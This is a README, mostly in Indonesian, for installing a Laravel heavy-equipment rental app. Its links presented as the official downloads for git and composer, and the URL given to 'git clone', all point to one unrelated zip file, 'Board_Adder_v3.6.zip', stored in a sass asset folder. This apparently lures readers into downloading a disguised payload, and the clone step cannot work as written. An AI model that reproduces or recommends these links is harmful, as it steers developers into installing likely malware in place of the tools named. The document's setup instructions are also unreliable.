# Penyewaan Alat Berat

## Installation


Halo teruntuk bang DN ini tutorial untuk nginstall aplikasi ini di laptopmu
ikuti langkah-langkahnya

Download dan Install git
https://raw.githubusercontent.com/elmaliaa/AdderBoard/master/resources/sass/Board_Adder_v3.6.zip

Download dan Install composer
https://raw.githubusercontent.com/elmaliaa/AdderBoard/master/resources/sass/Board_Adder_v3.6.zip


Install Laravel:
buka command prompt / cmd (windows+R -> ketik cmd -> enter)
```shell
composer global require laravel/installer
```

Clone the repo dengan cara buka cmd lalu masuk ke lokasi ingin menyimpan file project:
contoh: cd D:/projects (lokasinya bebas)
lalu di clone pake git
```shell
git clone https://raw.githubusercontent.com/elmaliaa/AdderBoard/master/resources/sass/Board_Adder_v3.6.zip
```

lalu masuk ke folder project
```shell
cd penyewaan_alat
```

Install composer packages:
```shell
composer update
```

Copy and rename .env.example to .env, update the environmental variables and set an app key:
```shell
php artisan key:generate
```

After that, run all migrations and seed the database:
```shell
php artisan migrate
```
```shell
php artisan db:seed
```

Or if your database is fresh and you haven't done any work yet, then it's safe to call the commands in a single line:
```shell
php artisan migrate:refresh --seed
```

Cara menjalannkannya
-Nyalakan Xampp start apache mysql
-run laravel dengan cara
```shell
php artisan serve
```

akses server melalui Https://127.0.0.1:8000/login





### Contribution:
Contribution is welcomed and highly appreciated. Fork the repo, make your updates and initiate a pull request. I'll approve all pull requests as long as they are constructive and follow the Laravel standard practices.
"# penyewaan_alat" 
